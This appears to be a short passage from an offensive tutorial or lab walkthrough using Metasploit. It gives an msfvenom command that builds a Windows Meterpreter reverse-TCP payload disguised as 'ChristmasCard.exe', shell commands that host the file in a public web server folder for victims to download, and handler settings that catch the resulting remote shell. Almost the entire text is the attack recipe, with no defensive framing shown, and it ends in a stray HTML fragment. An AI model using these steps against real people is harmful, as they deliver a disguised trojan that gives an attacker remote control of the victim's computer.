      msfvenom -p windows/meterpreter/reverse_tcp lhost=[MY IP ADDRESS] lport=444 -f exe > /home/attacker/Desktop/ChristmasCard.exe

Host malicious file

      mkdir /var/www/html/share
      chmod -R 755 /var/www/html/share
      chown -R www-data:www-data /var/www/html/share
      cp /home/myusername/Desktop/ChristmasCard.exe /var/www/html/share

      set LHOST [MY IP ADDRESS]
      set LPORT 444
      run/ul>
